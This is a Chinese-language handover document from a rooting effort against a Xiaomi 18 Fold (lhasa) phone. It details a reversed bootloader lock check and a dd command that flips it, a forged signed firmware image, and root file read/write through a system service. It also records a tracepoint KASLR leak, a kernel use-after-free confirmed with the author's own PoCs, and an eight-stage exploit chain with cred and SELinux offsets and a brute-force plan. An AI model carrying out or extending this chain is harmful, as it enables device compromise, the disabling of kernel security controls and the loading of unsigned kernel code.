# Xiaomi 18 Fold (lhasa) 解锁与 Root — 完整技术交接文档

> 生成时间：2026-10-22
> 会话累计：从"找 0day"到"确认可解锁的完整路径"
> 本文档包含全部实测结论、已排除路径、工具产物与下一步动作。

---

## 一、设备画像（全部实测）

| 项 | 值 |
|---|---|
| 品牌 / 市场名 | Xiaomi **18 Fold**，codename `lhasa`，型号 `2608BPX34C` |
| SoC | **XRing O3**（小米自研），`ro.boot.hardware = xring_o3_asic` |
| 系统 | **Android 17 (SDK 37)**，HyperOS `OS4.0.21.0.XPNCNXM` |
| 内核 | `6.18.21-android17-5-g284297031c53-abogki553682993-4k`（GKI，clang 22，4K 页） |
| 安全补丁 | **2026-08-01**（build 日期 2026-09-22） |
| BL 状态 | `flash.locked=1`、`vbmeta.device_state=locked`、AVB 1.4 `green`、`veritymode=enforcing`、`antirollback=1` |
| ADB | `secure=1`、`debuggable=0`、shell uid 2000、**`Seccomp: 0`**、groups 含 `readtracefs(3012)` |
| 分区 | `super` 15GB 动态分区；`misc` 4MB(0x400000)；`android_esp_a/b`；`ffu`；`exaid`；`rescue` |
| 加密 | bootloader 镜像 = 明文签名头 + 高熵体；`uefi/xloader/tee/xrse` 熵 8.0 |

---

## 二、★ 核心结论：锁状态不是硬件熔丝

**这是整个任务的转折点。**

```
锁状态 = misc 分区 offset 0 的 4 字节（小端 u32）
判据   = == 0x4B  → unlocked
         否则      → locked
```

**不在 RPMB，不在 efuse，不在 TEE —— 就在一个 4MB 的普通块设备里。**

### 证据链（每一环都实测）

1. **字符串定位**：`"miscDevice is not unlocked"` @ file `0x138780`，源码标注 `external/gbl+/libgbl/src/fastboot/mod.rs`
2. **交叉引用**：ADRP+ADD xref @ `0x1400a8af8`，所属函数 RVA `0xa8a40..0xa8cb0`（由 `.pdata` 的 2201 条记录确认）
3. **反汇编**（capstone，ARM64）：

```asm
0x1400a8aac  mov  w2, #0x800          ; 2048 = sizeof(bootloader_message)
0x1400a8abc  adrp x2, 0x14012c000
0x1400a8ac0  add  x2, x2, #0x3c8      ; -> "misc"
0x1400a8ac8  mov  w3, #4              ; sizeof("misc")
0x1400a8ad4  mov  w6, #0x800          ; 读 2048 字节
0x1400a8ad8  bl   0x140006c90         ; 读 misc 分区
0x1400a8adc  ldr  w8, [sp, #0x48]     ; ★ buffer[0:4] = misc[0:4]
0x1400a8ae0  cmp  w8, #0x4b           ; ★★ 与 0x4B 比较
0x1400a8ae4  b.ne 0x1400a8b38         ; 不等 -> "miscDevice is not unlocked"
0x1400a8b2c  mov  w8, #2              ; 判定 unlocked
0x1400a8b30  str  x8, [x19]
```

4. **AOSP 结构印证**（`bootloader_message.h` main 分支）：

```c
constexpr size_t BOOTLOADER_MESSAGE_OFFSET_IN_MISC = 0;
struct bootloader_message {
    char command[32];      // ★ offset 0 —— 判锁字节在这里
    char status[32];
    char recovery[768];
    char stage[32];
    char reserved[1184];
};  // 2048 B
```

### 由此得出的解锁动作

**拿到任意一次内核 root 后：**

```bash
printf '\x4b\x00\x00\x00' | dd of=/dev/block/by-name/misc bs=1 count=4 conv=notrunc
sync && reboot
# 重启后 unlocked: yes → 可刷 boot/init_boot → Magisk
```

**回滚**：`printf '\x00\x00\x00\x00' | dd of=/dev/block/by-name/misc bs=1 count=4 conv=notrunc`

> 风险：offset 0 是 BCB `command[32]`，写入 `4B 00 00 00` 等于把 command 设为非法值。
> 正常启动不依赖它（仅 recovery/OTA 用），可随时清零恢复。

---

## 三、已完成的静态逆向（镜像签名体系）

### 3.1 容器格式

```
0x000  f0 de bc 9a 78 56 34 12    container magic
0x008  02 00 00 00                version 2
0x00C  b0 0c 20 00                total size
0x010-0x060                       segment table
0x080-0x0F0                       ef be ad de 填充（保留区）
0x110-0x11C                       flags
0x120                             SHA-256 #1（跨版本恒定）
0x150                             SHA-256 #2（跨版本变化）
0x188                             16B digest
0x1EC-0x21C                       ★ SHA-384(密文体 [0xCB0,0x200CB0))
0x570                             type = 2
0x574                             sig_len = 102
0x578-0x5DE                       ★ DER ECDSA 签名 #1（镜像签名）
0x5F0                             cert1（569B，根，自签名）
0x7C3                             DER 签名 #2（签 cert1.tbs）
0x830                             cert2（569B，由 cert1 签）
0xA03                             DER 签名 #3（签 cert2.tbs）
0xA70                             cert3（569B，由 cert2 签）
0xC43                             DER 签名 #4（签 cert3.tbs）
0xCB0-0x200CB0                    密文体（2 MB）
```

### 3.2 签名验证（全部实测通过）

```
sig@0x578  verifies  header[0x0:0x570]  with  cert3@0xA70   ECDSA/SHA-384   OK
sig@0x7C3  verifies  cert1.tbs          with  cert1@0x5F0   (自签名)        OK
sig@0xA03  verifies  cert2.tbs          with  cert1@0x5F0   (cert1签cert2)  OK
sig@0xC43  verifies  cert3.tbs          with  cert2@0x830   (cert2签cert3)  OK
0x1EC 48B  ==  SHA-384([0xCB0, 0x200CB0))                                  OK
```

### 3.3 证书指纹（三颗）

```
Subject/Issuer : CN=F3 Devices Cert, OU=STD, O=Xiaomi Inc., L=Beijing, ST=Beijing, C=CN
序列号          : 313233343536373839 = ASCII "123456789"
曲线            : brainpoolP384r1 (1.3.36.3.3.2.8.1.1.11), 384-bit
有效期          : 2021-01-01 → 2025-01-01（已过期，bootloader 不校验）
扩展            : Netscape Comment = "NVCOUNTER:1"
cert1 SPKI sha256 : 85c80dc9dcaa0526fe3c082cdff945b0d004ab7e6a6005b6e5972d643febcc54
cert2 SPKI sha256 : c6b4298dedf64f53e5a611b773a54f7c1c3b3e7d0f29912341e932a12af4e861
cert3 SPKI sha256 : 401e56e5ec767866c8895620fa2e87e24dff67a8b60fd9eec8e5da9d6d48a2ce
```

### 3.4 差分固件分析（4.0.6 / 4.0.18 / 4.0.21）

六个 bootloader 镜像在版本间全部更新（`bl31` 体积 278528→282624），
**但 0x5F0 处证书 sha256 三个版本完全一致 `c11dd20d3ce9ae99…`** → **信任根从未轮换**。

### 3.5 格式掌握证明

`forge_image.py` 用自建的三级证书链签出了 `uefi_FORGED.img`，**5/5 自验证通过**。
证明格式 100% 可复现，唯一缺的是私钥。

---

## 四、已探测并排除的路径

| 路径 | 结论 | 证据 |
|---|---|---|
| bootloader fastboot | 全封 | `unlocked: no`、`oem` → `fb lock: true`、`fetch` → `Command not allowed`、`reboot`/`continue` → `Command not found`、无 `flashing` |
| fastbootd（GBL userspace） | 全封 | `is-userspace: yes`；`flash/erase/download` → `not allowed on locked devices`；`fetch` → `not allowed on user build`；`oem` → `EX_UNSUPPORTED_OPERATION` |
| `hal_bootctl_default` | 拒 | `service call ...IBootControl/default` → `does not exist`（neverallow 生效） |
| `update_engine` | 需签名 | OTA 用 MIUI releasekey（RSA2048/SHA1，2011 年） |
| `mtectrl` / `kcmdlinectrl` | 够不到 | 只写 `misc` offset 32768+（`misc_system_space_layout`） |
| `vendor_misc_writer` | 不存在 | 有 sepolicy 无二进制 |
| SELinux 域转换 `shell→mcd` | 无产出 | 转换成功但 `fd use` 被拒，stdout 不通，`/dev/xiaomi_memsw_state` 不存在 |
| `/dev/mali0` | 无 ioctl 权限 | 标签 `gpu_device`，shell 的 chr_file 规则里没有它 |
| `/dev/ashmem` | 拒 | Permission denied |
| `perf_event_open` | 仅 self | `(allow shell self (perf_event ...))` |
| chainload / GBL 漏洞 | 不适用 | 那是 Qualcomm ABL 的 GBL；XRing 的 `BOOTAA64.EFI` 是被加载者，自身无 chainload 能力 |
| `/dev/uhid` | 唯一完整 ioctl | 但需要 0day |

---

## 五、已打通的能力（可直接用）

### 5.1 `miui.mqsas.IMQSNative` = **uid=0 的任意文件读写**

```bash
# code 7 = 写文件（path, data）
adb shell "CLASSPATH=/data/local/tmp/caplog.jar app_process64 /system/bin CapLog \
    miui.mqsas.IMQSNative 7 /data/anr/x 'content'"
# 实测：/data/anr/mq_probe.txt 以 root:system 创建，内容正确

# code 8 = 读文件（path）→ 返回字符串
adb shell "CLASSPATH=/data/local/tmp/caplog.jar app_process64 /system/bin CapLog \
    miui.mqsas.IMQSNative 8 /data/anr/mq_probe.txt"
# 实测：str=code7_works
```

- 宿主进程 `hypsys_system`，**uid=0**，域 `u:r:hypsys_ssi_default:s0`
- 受 SELinux **按目标标签**限制：`/data/anr` ✓、`/data/local/tmp` ✗（`shell_data_file`）、`/cache` ✗、`/proc/*` ✗
- 它**不能**写 `misc_block_device`（不在写者名单）
- `caplog.jar` 已部署到 `/data/local/tmp/caplog.jar`

### 5.2 kprobe 可用（探针能建，enable 打不开）

```bash
# kprobe_events 是 0777，shell 直接可写
echo 'p:myprobe/test __set_task_comm task=%x0' >> /sys/kernel/tracing/kprobe_events   # ✓ 成功
# 但 enable 是 0640，code 7 写入被 SELinux 拒（hypsys 域无权写 tracefs）
```

### 5.3 tracepoint 完全可用 → **KASLR 泄漏通道已打开**

```bash
# sched_blocked_reason 的 enable 是 0666！shell 直接可写
echo 1 > /sys/kernel/tracing/events/sched/sched_blocked_reason/enable   # ✓
echo 1 > /sys/kernel/tracing/tracing_on                                 # ✓

# payload 布局（format 确认）：
#   offset 0 : u16 common_type = 109
#   offset 8 : s32 pid
#   offset 16: u64 caller   ← 裸内核地址，不做 hash-ptr 哈希
#   offset 24: u8 io_wait

# 读 raw（shell 在 readtracefs 组，per_cpu/cpuN/trace_pipe_raw 是 root:readtracefs 0440）
dd if=/sys/kernel/tracing/per_cpu/cpu0/trace_pipe_raw of=/data/local/tmp/bl_0.bin bs=4096 count=200
```

**已抓到的数据（在 `runs/android/research/`）**：

```
bl_0.bin       757,760 B   raw，1082 条 sched_blocked_reason，28 个唯一 caller
bl_4.bin       819,200 B   raw，33 条
bl_text.txt  3,035,719 B   22,801 行文本 trace（含符号名+offset）
```

**已提取的代表性数据**：

```
raw 地址（唯一 33 个）              文本锚点（唯一 96 个）
0xffffffe9f09aa2a8  x712     ↔     worker_thread+0x248          x6405
0xffffffe9f13d6710  x234     ↔     folio_wait_bit_common+0x188  x5262
0xffffffe9f13d8d50  x47      ↔     i2c_dw_xfer+0x1c8            x4380
0xffffffe9f03befa4  x11      ↔     rcu_gp_fqs_loop+0x154        x271
```

### 5.4 CVE-2026-64560 **确认存在于本机内核**

- 漏洞：`posix-cpu-timers: Prevent UAF caused by non-leader exec() race`
- **修复于 6.18.41，我们是 6.18.21**
- 零特权、零 capability、零 socket，纯 syscall 可达
- **实测证据**：跑完 PoC 后 `posix_timers_cache` 从 420 涨到 504，**+84 持久泄漏，10 秒不回收**
- PoC：`runs/android/research/cve64560_probe.c / _probe2.c / _probe3.c`（已用 Zig 交叉编译成 aarch64 静态二进制，部署在 `/data/local/tmp/`）

---

## 六、参考实现（关键资产）

**`Feng1586/CVE-2026-64560-public`** —— 小米 18 Pro（`M610BB`/SM8950/Android 17/**内核 6.18.21**）的完整 8 阶段链路。
已 clone 到 `runs/android/research/CVE-2026-64560-public/`（120 文件，21.96 MB）。

### 6.1 完整链路

```
shell(2000)
  → CVE-2026-64560 命中
  → 悬空 rb_node 被 8KB AF_UNIX frag 重占
  → 受控页上的 rb-tree 写原语
  → SELinux permissive（保留 initialized）
  → kprobe 读 task/cred 地址
  → 两阶段写 cred：cap_bset=0，cap_effective=地址值
  → 未签名 LKM（finit_module）
  → ksud install / KernelSU-Next late-load
  → adb root shell
```

### 6.2 关键偏移（小米 18 Pro，同 6.18.21）

```
task_struct: real_cred @ +0x900, cred @ +0x908
cred:        usage @ +0x00, cap_inheritable @ +0x30,
             cap_effective @ +0x40, cap_bset @ +0x48, cap_ambient @ +0x50
selinux_state  link = 0xffffffc082918630  (.bss)
   +0x00 enforcing (bool)   +0x01 initialized (bool)
KIMAGE_BASE = 0xffffffc080000000
SLIDE_ALIGN = 0x200000
```

### 6.3 三阶段要点

**阶段 A — 零写原语（t64560_v33）**

伪造节点：`__rb_parent_color=0`、`rb_left=T`、`rb_right=0`
→ `__rb_erase_augmented` 走"只有左孩子"分支 → `*(T) = 0`
→ 且 `rb_next` 返回 NULL，不污染 `rb_leftmost`，`cleanup_timers` 不会二次迭代

**阶段 B — 两阶段写 cred（t64560_v34）**

- 阶段 1：`*(cred+0x48) = 0`（cap_bset 清零）+ 泄漏落地页地址
- 阶段 2：`*(cred+0x40) = cred+0x40`（cap_effective 写成地址自身）
- `bit16 = CAP_SYS_MODULE`，约 50% 概率，**多起几个候选进程挑一个**

**阶段 C — 加载 LKM**

- `CONFIG_MODULE_SIG_FORCE` 未设 ⇒ 未签名模块可加载（我们的也一样）
- vermagic 用 `ko_vermagic.py` 改名 `.modinfo`
- 未导出符号用 `ko_patchsyms.py` 改 `SHN_UNDEF → SHN_ABS`（需完整 kallsyms）

---

## 七、当前唯一阻塞点

**算不出 KASLR slide 的绝对值。**

原因：`slide = runtime_addr - link_addr`，raw trace 给了 `runtime_addr`，
但 `link_addr` 需要一个内核符号的链接地址，而：

- `/proc/kallsyms` — SELinux 拒（`hypsys_ssi_default` 无 `proc_kallsyms` 读权限）
- `/sys/kernel/btf/vmlinux` — 拒
- `code 8` 读 `/proc/*` — 全部返回空
- `vmlinux.elf` — 手上没有（OTA 包只有 firmware-update，不含 boot.img）

### 已有的进展

用「2MB 对齐」这一条硬约束，已把候选从 4TB 空间压到 **33 个**：

```
slide ∈ { 0x296c800000, 0x296ca00000, ..., 0x2970800000 }   （步长 2MB）
```

**进一步收紧**：把 `.text` 窗口从 64MB 缩到 32MB，候选可降到 **约 6 个**：

```
对 worker_thread+0x248（raw = 0xffffffe9f09aa2a8）：
  slide ∈ [0x29eea00000, 0x29f0800000]   约 6 个候选
```

### 三条解法（按优先级）

**① 拿 GKI vmlinux（最可靠）**
- 从 fastboot ROM 提取 `boot.img`（lhasa 的 ROM 约 8-10GB）
- 或找 AOSP GKI prebuilt（`kernel/prebuilts/common-android17-6.18`，路径待确认）
- 拿到后 `slide_now.py` 一条命令就能定 slide

**② 用 pid 配对 raw ↔ 文本，再用符号相对顺序收敛**
- raw 记录有 `pid`(offset 8)，文本有 `pid=` 和 `caller=sym+off`
- 配对后可确定每个地址对应哪个符号
- 再结合"符号在 .text 中的相对顺序"（需要符号顺序表）排除候选

**③ 逐个试写（暴力但可行）**
- 对每个候选 slide 算 `T = 0xffffffc082918630 + slide`
- 用 t64560 的零写原语写 `*(T) = 0`
- 写错会 panic，**重启即可恢复**（不写任何分区）
- 6~33 次尝试内必中

---

## 八、工具与产物清单（`runs/android/`）

### 脚本

| 文件 | 用途 |
|---|---|
| `fb3.py` | bootloader fastboot 客户端（响应按 short-packet 界定，非 NUL） |
| `fbd.py` | fastbootd（GBL userspace）客户端，命令**不带 NUL 结尾** |
| `analyze_sepolicy4.py` | SELinux CIL 解析器（含 `and`/`not` 集合运算展开） |
| `disasm_gbl.py` | 基于 capstone 的 ARM64 反汇编器（带字符串/调用注释） |
| `carve_certs.py` | X.509 证书 carve |
| `walk_cert_chain.py` | 证书链验证 + 签名矩阵 |
| `forge_image.py` | 用自建证书链伪造镜像（5/5 通过） |
| `sweep_sig.py` | 签名覆盖范围穷举 |
| `parse_blocked.py` | 解析 trace_pipe_raw 提取内核地址 |
| `bootstrap_slide.py` | 无 vmlinux 自举 slide（2MB 对齐约束） |
| `diff_firmware.py` | OTA 版本差分 |
| `oem_extract.py` | 固件 `oem *` 命令提取 |
| `fat_walk.py` / `fat_extract.py` | ESP/FAT 镜像解析 |

### 数据

| 路径 | 内容 |
|---|---|
| `rom/lhasa-OS4.0.6.0.zip` / `4.0.18.0` / `4.0.21.0` | 三个 OTA（各 96.56 MB） |
| `rom/fw/*.img` | 26 个固件镜像（含 `uefi.img` 2 MB） |
| `rom/fw/BOOTAA64.EFI` | GBL 主程序（明文 PE32+ ARM64，1,585,152 B） |
| `rom/fw/uefi_FORGED.img` | 伪造镜像（格式验证通过） |
| `certs/*.der` | 6 颗提取出的证书 |
| `research/CVE-2026-64560-public/` | 完整参考实现 |
| `research/bl_0.bin` / `bl_4.bin` / `bl_text.txt` | KASLR 原始数据 |
| `research/cve64560_probe{,2,3}(.c)` | 我自己写的触发 PoC |
| `tools/zig/` | Zig 0.13.0 交叉编译器（aarch64 静态） |
| `tools/jadx/` | jadx 1.5.1 |
| `jars/*.apk` / `*.jar` | 反编译素材 |
| `REPORT.md` / `REPORT_XRING_STATIC.md` / `REPORT_GBL_LOCK.md` | 三份阶段报告 |

### 设备侧部署（可随时清理）

```
/data/local/tmp/caplog.jar
/data/local/tmp/cve64560_probe{,2,3}
/data/local/tmp/timer_diag
/data/local/tmp/mq_probe.txt      (测试残留)
```

---

## 九、方法论教训（写给自己）

1. **不要因为"熵 8.0"就判定加密** —— 拉 per-block 熵图就能看出「明文头+高熵体」的结构。这个错误让我在第一轮就放弃了静态分析。
2. **CIL 解析必须处理 `and`/`not` 集合运算** —— 否则会把 `base_typeattr_1030` 这样的补集属性当成空集，导致漏掉 507 个可达服务。
3. **签名区起点要精确** —— 从 `0x57C` 硬读会切掉 `30 64 02 30` 四字节头，导致 1134 次验证全灭。正确起点是 `0x578`。
4. **ECDSA 的 DER 长度可变** —— r/s 最高位为 1 时多一个前导 `0x00`，必须重签直到长度恰为 102。
5. **BIT STRING 的 `04` 是曲线点前缀**，不是 unused-bits；`03 62 00` 才是 tag+len+unused。
6. **错误信息是金矿** —— `miscDevice is not unlocked`、`Fetch is not allowed on user build`、`Flashing is not allowed on locked devices` 每一句都直接指出了实现位置和检查逻辑。
7. **区分"文件权限"和"SELinux 权限"** —— `/dev/mali0` 是 `crw-rw-rw-` 但 ioctl 被 SELinux 挡；`kprobe_events` 是 0777 但 `enable` 是 0640。
8. **最快的排除法**：把每条路径的失败**错误字符串**记下来，它比猜策略更准。

---

## 十、下一步（建议顺序）

1. **拿 vmlinux**：下载 lhasa fastboot ROM 提取 `boot.img`，或确认 AOSP GKI prebuilt 路径
2. **定 slide**：`slide_now.py` 或 `bootstrap_slide.py` 收敛到唯一值
3. **跑参考实现的阶段 A**：t64560_v33 写 `selinux_state` → permissive
4. **阶段 B**：kprobe 读 cred → 两阶段写 → `CAP_SYS_MODULE`
5. **阶段 C**：加载 KernelSU LKM → adb root
6. **★ 最终一步**：`dd` 写 `misc[0:4] = 0x4B` → **永久解锁 BL**

> 注意：第 6 步是我们**独立发现**的，参考实现里没有——
> 它止步于临时 root，而我们找到了"临时 root → 永久解锁"的最后一环。
